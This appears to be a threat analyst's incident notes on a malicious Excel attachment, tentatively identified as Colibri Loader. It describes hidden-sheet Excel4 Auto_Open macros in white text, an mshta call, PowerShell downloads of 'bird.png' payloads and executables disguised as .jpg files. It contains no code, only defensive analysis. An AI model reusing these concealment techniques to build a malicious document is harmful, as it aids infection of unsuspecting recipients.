THREAT IDENTIFICATION:  UNKNOWN LOADER

ANALYST NOTES
The associated emails had an attached .xls file which is password protected - the password for both is NOV17.
The Excel spreadsheet has a hidden sheet named GO with an Auto_Open named range starting at cell H1.
However, the minimal Excel4 macros located in this hidden sheet only go from cells H19-H22.
The macro text in the cells is colored white so it cannot be immediately seen.
Basically, the macro just calls mshta and points it at an .html page.
The .html page contains a message: "Source code is protected by HTML Guardian".
After this, I saw Powershell call out to download 2 instances of "bird.png" from 2 different IP addresses.
The 2 bird.png files have different file hashes and are slightly different in size.
I also found 2 files in the C:\Users\all folder that have .jpg extensions (but they're also 32-bit .exe files).
These are also similar in size to the bird.png files.
I saw no other network traffic after 20 minutes.
It was suggested that this may be Colibri Loader.
